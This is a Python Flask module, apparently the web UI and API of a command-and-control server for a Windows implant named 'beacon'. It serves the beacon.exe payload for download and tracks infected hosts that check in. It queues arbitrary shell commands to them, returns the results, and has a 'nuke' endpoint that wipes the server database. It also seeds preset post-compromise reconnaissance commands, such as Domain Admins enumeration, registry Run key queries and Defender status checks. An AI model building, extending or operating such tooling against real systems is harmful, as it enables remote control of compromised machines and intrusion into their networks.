"""
routes/ui.py — Web UI pages, JSON API, beacon file serving.
"""

from flask import Blueprint, render_template, request, jsonify, send_file
import time
import os
import sqlite3
import db

ui_bp = Blueprint("ui", __name__)

SERVER_DIR     = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PROJECT_DIR    = os.path.dirname(SERVER_DIR)
EXE_PATH       = os.path.join(PROJECT_DIR, "beacon", "target", "x86_64-pc-windows-gnu", "release", "beacon.exe")
DB_PATH        = os.path.join(SERVER_DIR, "server.db")
BEACON_TIMEOUT = 180


# DB Helper
#
def _col_exists(table, col):
    conn = sqlite3.connect(DB_PATH)
    cols = [r[1] for r in conn.execute(f"PRAGMA table_info({table})").fetchall()]
    conn.close()
    return col in cols


def init_ui_db():
    conn = sqlite3.connect(DB_PATH)
    try:
        if not _col_exists("beacons", "nickname"):
            conn.execute("ALTER TABLE beacons ADD COLUMN nickname TEXT DEFAULT NULL")
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS presets (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                name       TEXT NOT NULL,
                command    TEXT NOT NULL,
                created_at REAL NOT NULL
            );
        """)
        count = conn.execute("SELECT COUNT(*) FROM presets").fetchone()[0]
        if count == 0:
            now = time.time()
            defaults = [
                ("Who am I",            "whoami /all"),
                ("Hostname",            "hostname"),
                ("Network Info",        "ipconfig /all"),
                ("System Info",         "systeminfo"),
                ("Running Processes",   "tasklist"),
                ("Network Connections", "netstat -ano"),
                ("Local Admins",        "net localgroup administrators"),
                ("Domain Admins",       'net group "Domain Admins" /domain'),
                ("ARP Table",           "arp -a"),
                ("Scheduled Tasks",     "schtasks /query /fo LIST /v"),
                ("Registry Run Keys",   "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
                ("Defender Status",     "sc query WinDefend"),
            ]
            for name, cmd in defaults:
                conn.execute(
                    "INSERT INTO presets (name, command, created_at) VALUES (?,?,?)",
                    (name, cmd, now)
                )
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


# Page routes

@ui_bp.route("/")
def home():
    return render_template("home.html", active="home")

@ui_bp.route("/beacons")
def beacons_page():
    return render_template("beacons.html", active="beacons")

@ui_bp.route("/commands")
def commands_page():
    return render_template("commands.html", active="commands")

@ui_bp.route("/history")
def history_page():
    return render_template("history.html", active="history")


# Beacon file download

@ui_bp.route("/download/beacon")
def download_beacon():
    if not os.path.exists(EXE_PATH):
        return jsonify(status="error", message="beacon.exe not built yet."), 404
    return send_file(EXE_PATH, as_attachment=True, download_name="beacon.exe")


# JSON API

@ui_bp.route("/api/ui/beacons")
def api_beacons():
    cutoff  = time.time() - BEACON_TIMEOUT
    beacons = db.get_all_beacons()
    for b in beacons:
        if b["last_seen"] < cutoff and b["status"] == "alive":
            b["status"] = "dead"
    return jsonify(beacons=beacons)


@ui_bp.route("/api/ui/tasks")
def api_tasks():
    return jsonify(tasks=db.get_all_tasks(request.args.get("beacon")))


@ui_bp.route("/api/ui/result")
def api_result():
    task_id = request.args.get("task_id")
    if not task_id:
        return jsonify(result=None)
    results = db.get_results(task_id)
    return jsonify(result=results[0] if results else None)


@ui_bp.route("/api/ui/history")
def api_history():
    beacon_uuid = request.args.get("beacon")
    if not beacon_uuid:
        return jsonify(results=[])
    return jsonify(results=db.get_recent_results(beacon_uuid))


@ui_bp.route("/api/ui/task", methods=["POST"])
def api_create_task():
    data = request.get_json(silent=True)
    if not data or not data.get("beacon_uuid") or not data.get("cmd"):
        return jsonify(status="error", message="beacon_uuid and cmd required"), 400
    if not db.get_beacon(data["beacon_uuid"]):
        return jsonify(status="error", message="unknown beacon"), 404
    task_id = db.create_task(data["beacon_uuid"], "shell", {"cmd": data["cmd"]})
    return jsonify(status="ok", task_id=task_id)


@ui_bp.route("/api/ui/rename", methods=["POST"])
def api_rename():
    data = request.get_json(silent=True)
    if not data or not data.get("uuid"):
        return jsonify(status="error", message="uuid required"), 400
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "UPDATE beacons SET nickname=? WHERE uuid=?",
        (data.get("nickname") or None, data["uuid"])
    )
    conn.commit()
    conn.close()
    return jsonify(status="ok")


@ui_bp.route("/api/ui/presets")
def api_get_presets():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM presets ORDER BY created_at ASC").fetchall()
    conn.close()
    return jsonify(presets=[dict(r) for r in rows])


@ui_bp.route("/api/ui/presets", methods=["POST"])
def api_add_preset():
    data = request.get_json(silent=True)
    if not data or not data.get("name") or not data.get("command"):
        return jsonify(status="error", message="name and command required"), 400
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO presets (name, command, created_at) VALUES (?,?,?)",
        (data["name"], data["command"], time.time())
    )
    conn.commit()
    conn.close()
    return jsonify(status="ok")


@ui_bp.route("/api/ui/presets/<int:preset_id>", methods=["DELETE"])
def api_delete_preset(preset_id):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("DELETE FROM presets WHERE id=?", (preset_id,))
    conn.commit()
    conn.close()
    return jsonify(status="ok")


@ui_bp.route("/api/ui/nuke", methods=["POST"])
def api_nuke():
    try:
        if os.path.exists(DB_PATH):
            os.remove(DB_PATH)
        db.init_db()
        init_ui_db()
        return jsonify(status="ok")
    except Exception as e:
        return jsonify(status="error", message=str(e)), 500


def register_ui(app):
    init_ui_db()
    app.register_blueprint(ui_bp)
